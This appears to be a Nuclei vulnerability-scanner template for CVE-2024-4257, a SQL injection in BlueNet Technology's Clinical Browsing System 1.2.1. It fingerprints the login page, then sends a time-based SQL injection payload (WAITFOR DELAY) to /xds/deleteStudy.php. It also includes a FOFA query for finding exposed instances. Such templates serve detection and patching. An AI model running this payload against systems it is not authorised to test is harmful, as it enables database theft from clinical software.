flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - "contains(body,\"<title>\u4E34\u5E8A\u6D4F\u89C8</title>\")"
    - contains(header,"text/html")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /login.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(header,"text/html")
    - status_code == 200
    type: dsl
  raw:
  - '@timeout 20s

    GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:6%27--
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4257
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-4257
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cwe-id: CWE-89
    epss-percentile: 0.99724
    epss-score: 0.92538
  description: 'A vulnerability was found in BlueNet Technology Clinical Browsing
    System 1.2.1. It has been classified as critical. This affects an unknown part
    of the file /xds/deleteStudy.php. The manipulation of the argument documentUniqueId
    leads to sql injection. It is possible to initiate the attack remotely.

    '
  impact: 'Authenticated attackers can execute time-based SQL injection to extract
    sensitive database information.

    '
  metadata:
    fofa-query: "app=\"LANWON-\u4E34\u5E8A\u6D4F\u89C8\u7CFB\u7EDF\""
    max-request: 1
    verified: true
  name: BlueNet Technology Clinical Browsing System 1.2.1 - Sql Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4257
  - https://github.com/GAO-UNO/cve/blob/main/sql.md
  - https://vuldb.com/?submit.321338
  remediation: 'Update BlueNet Technology Clinical Browsing System to a version later
    than 1.2.1 that patches the SQL injection vulnerability.

    '
  severity: medium
  tags: time-based-sqli,cve,cve2024,sqli,blunet,vuln
